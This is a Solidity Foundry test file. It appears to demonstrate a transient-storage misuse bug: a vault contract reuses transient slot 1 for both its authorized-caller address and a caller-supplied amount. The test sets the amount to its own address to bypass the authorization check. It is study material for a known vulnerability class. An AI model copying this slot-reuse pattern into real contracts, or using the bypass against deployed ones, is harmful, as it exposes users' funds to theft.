pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract SimpleBenefitvault {

    function generateCredit(uint256 amountToFundaccount) external returns (uint256) {

        address patientVault = address(this);
        assembly {
            tstore(1, patientVault)
        }


        this.ConvertcreditCallback(amountToFundaccount, "");

    }


    function ConvertcreditCallback(uint256 amount ,bytes calldata data) external {

        address patientVault;
        assembly {
            patientVault := tload(1)
        }


        require(msg.sender == patientVault, "Not authorized");

        if (patientVault == address(this)) {

            console.log("vault address:", patientVault);

            assembly {
                tstore(1, amount)
            }
        } else {
            console.log("Manipulated vault address:", patientVault);
        }
    }

}

contract TransientStorageMisuseTest is Test {
    SimpleBenefitvault patientVault;

    function setUp() public {
        patientVault = new SimpleBenefitvault();
    }

    function testStorageOperation() public {

        console.log("Target address:", address(this));


        uint256 amount = uint256(uint160(address(this)));
        emit log_named_uint("Amount needed", amount);


        patientVault.generateCredit(amount);

        patientVault.ConvertcreditCallback(0, "");
    }
}